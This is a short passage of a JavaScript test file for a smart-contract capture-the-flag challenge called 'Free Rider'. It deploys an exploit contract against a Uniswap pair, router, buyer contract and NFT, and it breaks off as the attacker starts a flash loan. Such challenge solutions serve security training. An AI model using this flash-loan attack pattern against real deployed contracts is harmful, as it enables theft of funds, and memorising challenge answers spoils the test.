...
describe("[Challenge] Free Rider", function () {
    ...
    it("Exploit", async function () {
        const exploit = await (
            await ethers.getContractFactory("FreeRiderExploit", deployer)
        ).deploy(this.uniswapPair.address, this.uniswapRouter.address, this.buyerContract.address, this.nft.address);

        await exploit.connect(attacker).flashLoan(
            this.weth.address,
            this.token.address,
